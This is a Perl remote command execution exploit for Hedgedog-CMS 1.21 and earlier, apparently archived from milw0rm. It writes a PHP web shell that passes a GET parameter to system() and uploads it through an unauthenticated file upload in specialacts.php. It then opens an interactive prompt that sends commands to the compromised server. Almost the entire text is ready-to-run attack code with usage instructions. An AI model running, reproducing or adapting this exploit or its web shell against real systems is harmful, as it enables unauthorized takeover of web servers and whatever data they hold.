--+++===================================================================+++--
--+++====== Hedgedog-CMS <= 1.21 Remote Command Execution Exploit ======+++--
--+++===================================================================+++--

#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;

sub usage
{
	print
		"\nHedgedog-CMS <= 1.21 Remote Command Execution Exploit".
		"\n[+] Author   : darkjoker".
		"\n[+] Site     : http://darkjoker.net23.net".
		"\n[+] Download : http://mesh.dl.sourceforge.net/sourceforge/hedgehog-cms/hedgehog-cms_v1.21.zip".
		"\n[+] Usage    : perl ${0} <hostname> <path>".
		"\n[+] Ex.      : perl ${0} localhost /hedgedogCMS".
		"\n\n";
	exit ();
}

sub upload_shell
{
	my ($host, $path) = @_;
	open SHELL, ">shell.php";
	print SHELL "<?php system (stripslashes (\$_GET ['cmd'])); ?>";
	close SHELL;
	my $url = "http://${host}${path}/specialacts.php";
	my $lwp = LWP::UserAgent->new;
	my $req = $lwp->request	(
					POST $url,
					Content_Type => 'multipart/form-data',
					Content	    => [l_mode => 1, l_file => ["shell.php"]],
				);
	unlink "shell.php";
	return 1 if ($req->is_success);
	return 0;
}

my ($host, $path) = @ARGV;
usage unless $path;
print "[-] Exploit failed.\n" unless upload_shell ($host, $path);
my $cmd;
my $url = "http://${host}${path}/user/upload/shell.php";
while (1)
{
	print "shell\@${host}: \$ ";
	$cmd = <STDIN>;
	chomp $cmd;
	exit if $cmd =~ /quit/;
	my $lwp = LWP::UserAgent->new;
	my $req = $lwp->get (
			    	$url . "?cmd=${cmd}",
			    );
	print $req->decoded_content;
}

# milw0rm.com [2009-02-09]
